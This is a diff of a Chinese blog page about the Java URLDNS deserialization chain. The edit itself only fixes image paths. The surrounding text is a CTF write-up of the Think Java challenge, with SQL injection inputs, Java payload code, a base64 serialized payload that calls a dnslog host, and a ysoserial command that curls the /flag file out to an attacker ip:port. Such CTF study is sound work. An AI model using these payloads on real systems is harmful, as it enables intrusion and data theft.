@@ -345,13 +345,13 @@
 *           URL.hashCode()</code></pre>
 
 <p>URL继承了Serializable接口，所以可以反序列化</p>
-<p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906130431694.png"></p>
+<p><img src="/images/posts/UrlDns/image-20240906130431694.png"></p>
 <p>URL中hashCode函数调用handler的hashCode,handler的hashCode根据地址解析请求</p>
-<p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906130636566.png"></p>
-<p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906130717402.png"></p>
+<p><img src="/images/posts/UrlDns/image-20240906130636566.png"></p>
+<p><img src="/images/posts/UrlDns/image-20240906130717402.png"></p>
 <p>找一个JDK自带的入口点，就是HashMap,HashMap的readObject方法里面调用了hash方法，hash方法调用了hashCode</p>
-<p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906131001165.png"></p>
-<p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906131125602.png"></p>
+<p><img src="/images/posts/UrlDns/image-20240906131001165.png"></p>
+<p><img src="/images/posts/UrlDns/image-20240906131125602.png"></p>
 <p><code>K key = (K) s.readObject();</code><br>这行代码从输入流 <code>s</code> 中读取一个对象，并将其强制转换为 <code>K</code> 类型的对象。这里的 <code>K</code> 是 <code>HashMap</code> 中的键的类型。</p>
 <p>所以把url给put进去，同名函数调用就可以走到URL的hashCode方法里面</p>
 <pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>
@@ -374,10 +374,10 @@
 </code></pre>
 
 <p>但在hashMap的put方法里面也调用了hash函数，在反序列化之前就发起了Dns请求</p>
-<p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906131644117.png"></p>
+<p><img src="/images/posts/UrlDns/image-20240906131644117.png"></p>
 <p>URL中当hashCode&#x3D;-1时才会触发handler的hashCode，hashCode初始化就是-1</p>
-<p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906131747810.png"></p>
-<p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906131930314.png"></p>
+<p><img src="/images/posts/UrlDns/image-20240906131747810.png"></p>
+<p><img src="/images/posts/UrlDns/image-20240906131930314.png"></p>
 <p>所以在调用反射，在put前将其修改不为-1，put后修改回-1。</p>
 <pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
     <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>URL<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>URL<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -406,9 +406,9 @@
 <span class="token punctuation">&#125;</span></code></pre>
 
 <h2 id="利用：-网鼎杯-2020-朱雀组-Think-Java例子"><a href="#利用：-网鼎杯-2020-朱雀组-Think-Java例子" class="headerlink" title="利用：[网鼎杯 2020 朱雀组]Think Java例子"></a>利用：[网鼎杯 2020 朱雀组]Think Java例子</h2><p>SqlDict文件拼接SQL语句，存在SQL注入</p>
-<p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906214506699.png"></p>
+<p><img src="/images/posts/UrlDns/image-20240906214506699.png"></p>
 <p>路由是&#x2F;common&#x2F;test&#x2F;sqlDict</p>
-<p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906214456321.png"></p>
+<p><img src="/images/posts/UrlDns/image-20240906214456321.png"></p>
 <p>网站swagger接口泄露，&#x2F;swagger-ui.html的&#x2F;common&#x2F;test&#x2F;sqlDict接口下SQL注入获取账户密码admin,admin@Rrrr_ctf_asde</p>
 <pre class="language-none"><code class="language-none">myapp#a&#x3D;&#39; union select (select name from user)#
 myapp#a&#x3D;&#39; union select (select pwd from user)#</code></pre>
@@ -418,7 +418,7 @@ myapp#a&#x3D;&#39; union select (select pwd from user)#</code></pre>
 
 <p>rO0AB开头，基本确定反序列化文件内容编码</p>
 <p>&#x2F;common&#x2F;user&#x2F;current放入请求返回得到信息</p>
-<p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906215618328.png"></p>
+<p><img src="/images/posts/UrlDns/image-20240906215618328.png"></p>
 <p>用之前的UrlDns链生成payload测试，在将内容base64编码</p>
 <pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">POC</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
@@ -442,7 +442,7 @@ myapp#a&#x3D;&#39; union select (select pwd from user)#</code></pre>
 <pre class="language-none"><code class="language-none">Bearer rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa&#x2F;ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;3QAEDNtN3B2aS5kbnNsb2cuY250AABxAH4ABXQABGh0dHBweHNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAB7eA&#x3D;&#x3D;</code></pre>
 
 <p>成功收到请求</p>
-<p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906215339584.png"></p>
+<p><img src="/images/posts/UrlDns/image-20240906215339584.png"></p>
 <p>后面用ysoserial生成payload,再加密直接把flag外带出来就行</p>
 <pre class="language-cmd" data-language="cmd"><code class="language-cmd">java -jar ysoserial-all.jar ROME &quot;curl http:&#x2F;&#x2F;ip:port -d @&#x2F;flag&quot; &gt; 1.ser</code></pre>
 
@@ -839,7 +839,7 @@ myapp#a&#x3D;&#39; union select (select pwd from user)#</code></pre>
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">50k</span>
+                        class="white-color">50.3k</span>
             
             
             
